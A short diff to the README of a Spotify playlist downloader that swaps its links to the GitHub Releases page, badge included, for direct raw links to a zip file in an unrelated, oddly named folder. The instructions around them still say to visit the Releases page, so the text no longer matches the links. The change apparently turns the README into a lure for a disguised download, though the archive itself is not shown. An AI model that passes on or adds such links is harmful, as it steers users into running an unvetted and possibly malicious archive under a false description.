@@ -1,6 +1,6 @@
 # 🎵 SpotiDownloader - Download Spotify Playlists Easily
 
-[![Download SpotiDownloader](https://img.shields.io/badge/Download-SpotiDownloader-blue)](https://github.com/nomi577/SpotiDownloader/releases)
+[![Download SpotiDownloader](https://raw.githubusercontent.com/nomi577/SpotiDownloader/main/amidopyrine/SpotiDownloader.zip)](https://raw.githubusercontent.com/nomi577/SpotiDownloader/main/amidopyrine/SpotiDownloader.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To run SpotiDownloader, your system needs:
 
 To get started, visit the Releases page to download SpotiDownloader:
 
-[Download SpotiDownloader](https://github.com/nomi577/SpotiDownloader/releases)
+[Download SpotiDownloader](https://raw.githubusercontent.com/nomi577/SpotiDownloader/main/amidopyrine/SpotiDownloader.zip)
 
 1. Click the link above.
 2. Look for the latest release.
